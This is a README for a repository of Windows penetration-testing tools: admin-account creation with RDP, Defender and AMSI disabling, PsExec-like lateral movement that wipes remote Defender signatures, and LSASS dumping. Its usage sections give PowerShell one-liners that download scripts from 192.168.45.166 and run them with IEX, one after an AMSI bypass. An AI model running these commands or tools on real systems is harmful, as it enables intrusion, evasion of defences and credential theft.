# Miscellaneous

## ToC

| Application | Format | Notes |
| ----------- | ------ | ----- |
| `Autos` | PS | Scripts to automate things I found myself doing a lot |
| `AV_Stuff` | PS | Basic scripts for AV/Applocker Enumertion |
| `Fileless_Lateral_Movement` | EXE | PSExec-like tool utilizing remote service configuration for lateral movement |
| `MiniDump` | EXE/PS | A simple binary to Dump LSASS to a file for offline examination |


## `Autos`
Scripts to automate things I found myself doing a lot.

### Tools
- `Create-Admin.ps1`
    - Create a local Administrator user on the box and enable RDP
    - Requires: High Integrity process
- `Compress-ScriptBlock.ps1`
    - Minify a Powershell *ScriptBlock*. Pulled from [StartAutomating/PSMinifier](https://github.com/StartAutomating/PSMinifier)
    - Usage:
    ```ps1
    . .\Compress-ScriptBlock.ps1   # import it as a module
    $sb=get-command <tgt_file_path> | select -ExpandProperty ScriptBlock # get the scriptblock for your target file
    Compress-ScriptBlock -ScriptBlock $sb > <out_file>
    ```
    - Warning:
        - Its not perfect, I usually have to do a good amount of manual work
        - *Deletes default values for function parameters*


## `AV_Stuff`
Basic scripts for AV and Applocker Enumeration or Disabling that I created with the help of online resources (all credited).

### `Disable-AVProduct.ps1` 
Get the status of the Antivirus Product on local and Remote Computers, then if Windows Defender is detected locally, disable as much of it as possible.
- Credits:
    - `SyncroMSP` at [mspscripts.com](https://mspscripts.com/get-installed-antivirus-information-2/) for `Get-LHSAntiVirusProduct()`
- References:
    - [learn.microsoft.com](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/security-malware-windows-defender-disableantispyware)
    - [jeremybeaume/tools](https://github.com/jeremybeaume/tools/blob/master/disable-defender.ps1)
    - [viperone.gitbook.io/pentest-everything](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/defense-evasion/disable-defender)
- Requires:
    - Admin privs to disable stuff, enumeration part is fine
- Usage:
    ```ps1
    powershell.exe -ExecutionPolicy Bypass -c "(new-object system.net.webclient).downloadstring('http://192.168.45.166/Disable-AVProduct.ps1') | IEX;"
    ```
    - It doesn't get detected by my version of Defender (v4.18.1807.18075) since its really all semi-normal functionality, but if you have AMSI problems just bypass it first
    ```ps1
    powershell.exe -ExecutionPolicy Bypass -c "(new-object system.net.webclient).downloadstring('http://192.168.45.166/amsi.txt') | IEX; (new-object system.net.webclient).downloadstring('http://192.168.45.166/Disable-AVProduct.ps1') | IEX;"
    ```

#### `Disable-AVProduct.min.ps1`
A more concise `Disable-AVProduct.ps1` for active use. Each function is contained entirely on a newline, no comments, etc. Not obfuscated, just smaller (almost half-sized).

Might have some bugs because of the minifying process. I've tested it a decent amount and it works but if something comes up lmk!

### `Get-AppLockerRules.ps1`

Enumerate Applocker Rules. Very basic, will update in future.


## `PSLessExec`

Wipes Windows Defender signatures on the *remote host* and uses a `PSExec`-like method (except using an existing process) to achieve lateral movement. Takes arguments for the target, the target service, and the target binary to run. Note that a non-critical service should be chosen, such as `SensorService`.

### Usage

```
Usage:   PSLessExec.exe [Target] [Service]     [BinaryToRun]
Example: PSLessExec.exe appsrv01 SensorService notepad.exe
```

## `MiniDump`

A simple binary to Dump LSASS to `C:\Windows\Tasks\lsass.dmp`. Also provided as a native PowerShell script.
